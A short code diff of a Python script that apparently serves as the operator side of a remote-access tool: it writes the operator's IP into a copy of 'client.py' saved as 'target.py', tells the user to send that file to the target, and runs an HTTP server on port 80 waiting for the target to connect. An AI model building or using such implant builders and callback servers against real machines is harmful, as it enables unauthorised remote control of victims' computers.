@@ -15,8 +15,8 @@ def arguments():
 def setTargetFile(ip):
     with open('client.py', 'r') as file :
         filedata = file.read()
-    find='IP=""'
-    replace=f'IP="{ip}"'
+    find='SERVER=None'
+    replace=f'SERVER = "http://{ip}"'
     filedata = filedata.replace(find, replace)
     with open('target.py', 'w') as file:
         file.write(filedata)
@@ -36,14 +36,14 @@ def main():
         try:
             httpd = HTTPServer((IP, 80), HTTPHandler)
             print("taget.py is created, Now send the target.py to target")
-            print(f"Server started on {IP}:80\nWaiting for target to connect and")
+            print(f"Server started on {IP}:80\nWaiting for target to connect...")
             httpd.serve_forever()
         except KeyboardInterrupt:
             print("You Have Closed the service")
             break
             os.remove('target.py')
-        except Exception as e:
-            print (str(e))
+        except PermissionError as e:
+            print ("Try out with sudo")
             os.remove('target.py')
             break      
 
